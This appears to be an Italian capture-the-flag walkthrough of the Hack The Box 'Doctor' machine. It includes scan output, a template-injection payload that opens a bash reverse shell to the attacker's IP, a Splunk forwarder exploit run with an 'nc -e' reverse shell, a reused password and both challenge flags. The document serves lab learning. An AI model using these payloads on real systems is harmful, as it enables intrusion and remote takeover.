@@ -1,0 +1,259 @@
+nmap -A 10.10.10.209
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-18 16:12 EST
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:12
+Completed NSE at 16:12, 0.00s elapsed
+Initiating NSE at 16:12
+Completed NSE at 16:12, 0.00s elapsed
+Initiating NSE at 16:12
+Completed NSE at 16:12, 0.00s elapsed
+Initiating Ping Scan at 16:12
+Scanning 10.10.10.209 [2 ports]
+Completed Ping Scan at 16:12, 0.06s elapsed (1 total hosts)
+Initiating Connect Scan at 16:12
+Scanning doctor.htb (10.10.10.209) [65535 ports]
+Discovered open port 22/tcp on 10.10.10.209
+Discovered open port 80/tcp on 10.10.10.209
+Connect Scan Timing: About 20.77% done; ETC: 16:15 (0:01:58 remaining)
+Connect Scan Timing: About 40.47% done; ETC: 16:15 (0:01:30 remaining)
+Discovered open port 8089/tcp on 10.10.10.209
+Connect Scan Timing: About 65.33% done; ETC: 16:14 (0:00:48 remaining)
+Completed Connect Scan at 16:14, 126.86s elapsed (65535 total ports)
+Initiating Service scan at 16:14
+Scanning 3 services on doctor.htb (10.10.10.209)
+Completed Service scan at 16:15, 31.16s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.10.209.
+Initiating NSE at 16:15
+Completed NSE at 16:15, 8.51s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.57s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Nmap scan report for doctor.htb (10.10.10.209)
+Host is up (0.061s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                                                                     
+| http-methods:                                                                                                                                                                                                                            
+|_  Supported Methods: HEAD GET POST OPTIONS                                                                                                                                                                                               
+|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                                                               
+|_http-title: Doctor                                                                                                                                                                                                                       
+8089/tcp open  ssl/http Splunkd httpd                                                                                                                                                                                                      
+| http-methods:                                                                                                                                                                                                                            
+|_  Supported Methods: GET HEAD OPTIONS                                                                                                                                                                                                    
+| http-robots.txt: 1 disallowed entry                                                                                                                                                                                                      
+|_/                                                                                                                                                                                                                                        
+|_http-server-header: Splunkd                                                                                                                                                                                                              
+|_http-title: splunkd                                                                                                                                                                                                                      
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser                                                                                                                                                        
+| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US                                                                                                                                          
+| Public Key type: rsa                                                                                                                                                                                                                     
+| Public Key bits: 2048                                                                                                                                                                                                                    
+| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                                                                             
+| Not valid before: 2020-09-06T15:57:27                                                                                                                                                                                                    
+| Not valid after:  2023-09-06T15:57:27                                                                                                                                                                                                    
+| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
+|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 167.72 seconds
+
+
+-------------------------------------------------------------------------------------------------------------
+Andiamo alla pagina web sulla porta 80. Visioniamo il codice sorgente.
+-------------------------------------------------------------------------------------------------------------
+Visioniamo anche la pagina dell'applicazione splunk: https://10.10.10.209:8089
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb
+dirb 10.10.10.209 -w /usr/share/wordlists/dirb/common.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov 18 16:00:26 2020
+URL_BASE: http://10.10.10.209/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.209/ ----
+==> DIRECTORY: http://10.10.10.209/css/                                                                                                                                                                                                   
+==> DIRECTORY: http://10.10.10.209/fonts/                                                                                                                                                                                                 
+==> DIRECTORY: http://10.10.10.209/images/                                                                                                                                                                                                
++ http://10.10.10.209/index.html (CODE:200|SIZE:19848)                                                                                                                                                                                    
+==> DIRECTORY: http://10.10.10.209/js/                                                                                                                                                                                                    
++ http://10.10.10.209/server-status (CODE:403|SIZE:277)                                                                                                                                                                                   
+                                                                                                                                                                                                                                          
+---- Entering directory: http://10.10.10.209/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                                          
+---- Entering directory: http://10.10.10.209/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                                          
+---- Entering directory: http://10.10.10.209/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                                          
+---- Entering directory: http://10.10.10.209/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                                          
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: COULDNT CONNECT)
+                                                                               
+-----------------
+END_TIME: Wed Nov 18 16:24:31 2020
+DOWNLOADED: 20362 - FOUND: 2
+
+-------------------------------------------------------------------------------------------------------------
+Dopo ore e ore di sbattimento, noto che nella pagina web c'è un inidirzzo email info@doctors.htb
+Aggiorno il file /etc/hosts dato che io avevo messo doctor.htb
+E qualcosa si smuove, trovo una pagina di login.
+Creo un utente
+-------------------------------------------------------------------------------------------------------------
+Effettuo il login e c'è la possibilità di creare commenti. Inserisco il seguente codice per avere una reverse shell
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.195/4444 0>&1'").read()}}{%endif%}{%endfor%}
+
+Sulla mia macchina nc -nlvp 4444
+
+Ottimo, sono dentro!
+-------------------------------------------------------------------------------------------------------------
+Scarichiamo linpeas.sh, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
+sudo python -m SimpleHTTPServer 80
+wget http://10.10.14.195:80/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh > linpeas
+
+Analizziamo linpeas
+-------------------------------------------------------------------------------------------------------------
+/etc/mysql/my.cnf
+
+/etc/ssh/ssh_config
+
+/etc/ld.so.conf.d/libc.conf
+-------------------------------------------------------------------------------------------------------------
+find / -group adm 2>/dev/null
+Cerchiamo qualche file che possa esserci utile. Troviamo un backup. Analizziamo
+cat /var/log/apache2/backup
+Nel backup c'è una richiesta di reset password.
+Proviamo: 
+su shaun
+Guitar123
+Connessi!
+
+-------------------------------------------------------------------------------------------------------------
+Otteniamo una shell migliore
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+-------------------------------------------------------------------------------------------------------------
+Otteniamo la flag
+cat user.txt
+682d8079d9b712e603e53fc78ec3ad95
+-------------------------------------------------------------------------------------------------------------
+Proviamo qualche comando per sapere come poter arrivare al root
+
+sudo -l  => Niente di interessante...
+-------------------------------------------------------------------------------------------------------------
+Cerchiamo se l'utente ha SUID
+find / -perm -u=s -type f 2>/dev/null
+
+/snap/snapd/7264/usr/lib/snapd/snap-confine
+/snap/snapd/8542/usr/lib/snapd/snap-confine
+/snap/core18/1705/bin/mount
+/snap/core18/1705/bin/ping
+/snap/core18/1705/bin/su
+/snap/core18/1705/bin/umount
+/snap/core18/1705/usr/bin/chfn
+/snap/core18/1705/usr/bin/chsh
+/snap/core18/1705/usr/bin/gpasswd
+/snap/core18/1705/usr/bin/newgrp
+/snap/core18/1705/usr/bin/passwd
+/snap/core18/1705/usr/bin/sudo
+/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1705/usr/lib/openssh/ssh-keysign
+/snap/core18/1880/bin/mount
+/snap/core18/1880/bin/ping
+/snap/core18/1880/bin/su
+/snap/core18/1880/bin/umount
+/snap/core18/1880/usr/bin/chfn
+/snap/core18/1880/usr/bin/chsh
+/snap/core18/1880/usr/bin/gpasswd
+/snap/core18/1880/usr/bin/newgrp
+/snap/core18/1880/usr/bin/passwd
+/snap/core18/1880/usr/bin/sudo
+/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1880/usr/lib/openssh/ssh-keysign
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/sbin/exim-4.90-6
+/usr/sbin/mount.nfs
+/usr/sbin/pppd
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-------------------------------------------------------------------------------------------------------------
+Controlliamo anche i cronjob
+cat /etc/crontab
+Niente di interessante...
+-------------------------------------------------------------------------------------------------------------
+Cerchiamo file scrivibili
+find /-writable -type d 2>/dev/null 
+Ma niente da fare...
+
+-------------------------------------------------------------------------------------------------------------
+wget http://10.10.14.195:80/polkit-pwnage.c
+gcc polkit-pwnage.c -o pwnit
+./pwnit 
+
+Niente da fare, vale solo fino alla versione 0.010, la nostra è la versione 0.105
+
+-------------------------------------------------------------------------------------------------------------
+Dopo un po' di sbattimento, non trovando nulla che possa essere d'aiuto, ricordo che c'è il servizio di splunk attivo. Cerco un exploit e trovo SplunkWhisperer2.
+Seguo le istruzioni e provo i seguenti comandi:
+
+Terminale 1:
+git clone https://github.com/cnotin/SplunkWhisperer2.git
+cd /SplunkWhisperer2/PySplunkWhisperer2/
+python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.195 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/sh '10.10.14.195' '5555'
+
+Terminale 2:
+nc -nvlp 5555
+
+Shell root ottenuta!
+
+-------------------------------------------------------------------------------------------------------------
+whoami
+pwd
+cat /root/root.txt
+c8b49e1714e7124e1224b585419ab5e2
